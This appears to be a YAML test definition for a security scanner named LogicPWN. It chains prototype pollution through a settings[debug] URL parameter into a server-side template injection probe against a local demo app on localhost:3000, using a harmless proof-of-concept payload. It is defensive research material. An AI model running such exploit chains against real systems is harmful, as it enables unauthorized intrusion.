# LogicPWN Simple Prototype Pollution → SSTI Exploit Chain
# Demonstrates the basic vulnerability chain with specific curl commands
# Author: LogicPWN Security Research Team

name: "Simple Prototype Pollution → SSTI Chain"
description: "Basic exploit chain demonstrating prototype pollution leading to SSTI injection"
session_state:
  target_base_url: "http://localhost:3000"

steps:
  # Step 1: Prototype Pollution via settings[debug]=true
  - name: "Prototype Pollution Attack"
    description: "Exploit prototype pollution vulnerability via URL parameters"
    request_config:
      method: "GET"
      url: "http://localhost:3000/?settings%5Bdebug%5D=true"
      headers:
        User-Agent: "LogicPWN/1.0 Security Scanner"
    success_indicators:
      - "200"
    failure_indicators:
      - "404"
      - "500"
    retry_count: 2

  # Step 2: Template Engine Testing (POST /theme)
  - name: "Template Engine Detection"
    description: "Test template engine response via POST request"
    request_config:
      method: "POST"
      url: "http://localhost:3000/theme"
      headers:
        User-Agent: "LogicPWN/1.0 Security Scanner"
    success_indicators:
      - "200"
    failure_indicators:
      - "404"
      - "500"
    retry_count: 2

  # Step 3: SSTI Injection Attack
  - name: "SSTI Injection Attack"
    description: "Perform Server-Side Template Injection with JSON payload"
    request_config:
      method: "POST"
      url: "http://localhost:3000/theme"
      headers:
        Content-Type: "application/json"
        User-Agent: "LogicPWN/1.0 Security Scanner"
      json_data:
        message: "p Hello from injection!"
    success_indicators:
      - "200"
      - "Hello from injection"
    failure_indicators:
      - "404"
      - "500"
    retry_count: 2
